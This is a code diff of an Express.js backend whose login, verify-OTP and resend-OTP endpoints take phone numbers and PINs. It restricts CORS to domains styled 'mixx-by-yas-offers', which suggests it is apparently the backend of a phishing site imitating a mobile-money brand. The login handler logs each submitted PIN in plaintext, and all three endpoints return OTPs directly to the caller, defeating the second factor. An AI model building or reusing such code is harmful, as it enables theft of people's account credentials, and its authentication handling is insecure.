@@ -1,16 +1,41 @@
-// backend/server.js
 const express = require('express');
 const cors = require('cors');
 const app = express();
 
+// ===== CORS CONFIGURATION - FIXED =====
+const corsOptions = {
+    origin: [
+        'https://mixx-by-yas-offers-06-com.onrender.com',
+        'https://mixxbyyas-offers06com-production.up.railway.app',
+        'http://localhost:3000',
+        'http://localhost:5000'
+    ],
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
+    credentials: true,
+    optionsSuccessStatus: 200
+};
+
+// Apply CORS middleware
+app.use(cors(corsOptions));
+
+// Handle preflight requests explicitly
+app.options('*', cors(corsOptions));
+
 // ===== MIDDLEWARE =====
-app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// ===== LOGGING =====
+app.use((req, res, next) => {
+    console.log(`📥 ${req.method} ${req.url}`);
+    console.log(`📥 Origin: ${req.headers.origin}`);
+    next();
+});
 
 // ===== PORT =====
 const PORT = process.env.PORT || 5000;
 
-// ===== LOGGING =====
 console.log('🚀 Starting server...');
 console.log(`📡 PORT: ${PORT}`);
 
@@ -29,10 +54,12 @@ app.get('/api/health', (req, res) => {
     res.json({
         status: 'healthy',
         timestamp: new Date().toISOString(),
-        port: PORT
+        port: PORT,
+        cors: 'enabled'
     });
 });
 
+// ===== LOGIN ENDPOINT =====
 app.post('/api/login', (req, res) => {
     console.log('📥 Login request received:', req.body);
     const { phone, pin } = req.body;
@@ -51,10 +78,15 @@ app.post('/api/login', (req, res) => {
     res.json({
         status: 'success',
         message: 'OTP generated successfully',
-        data: { phone, otp }
+        data: { 
+            phone: phone,
+            otp: otp,
+            otpSent: true
+        }
     });
 });
 
+// ===== VERIFY OTP ENDPOINT =====
 app.post('/api/verify-otp', (req, res) => {
     console.log('📥 Verify OTP:', req.body);
     const { phone, otp } = req.body;
@@ -70,7 +102,10 @@ app.post('/api/verify-otp', (req, res) => {
         res.json({
             status: 'success',
             message: 'OTP verified successfully!',
-            data: { phone, verified: true }
+            data: { 
+                phone: phone, 
+                verified: true 
+            }
         });
     } else {
         res.status(400).json({
@@ -80,6 +115,7 @@ app.post('/api/verify-otp', (req, res) => {
     }
 });
 
+// ===== RESEND OTP ENDPOINT =====
 app.post('/api/resend-otp', (req, res) => {
     console.log('📥 Resend OTP:', req.body);
     const { phone } = req.body;
@@ -97,7 +133,10 @@ app.post('/api/resend-otp', (req, res) => {
     res.json({
         status: 'success',
         message: 'New OTP sent successfully!',
-        data: { phone, otp }
+        data: { 
+            phone: phone, 
+            otp: otp 
+        }
     });
 });
 
@@ -123,10 +162,11 @@ app.use((err, req, res, next) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📍 URL: https://mixxbyyas-offers06com-production.up.railway.app`);
+    console.log(`🔗 Allowed origins: ${corsOptions.origin.join(', ')}`);
     console.log('✅ Server is ready!');
 });
 
-// Log when server crashes
+// ===== HANDLE CRASHES =====
 process.on('uncaughtException', (err) => {
     console.error('💥 Uncaught exception:', err);
 });
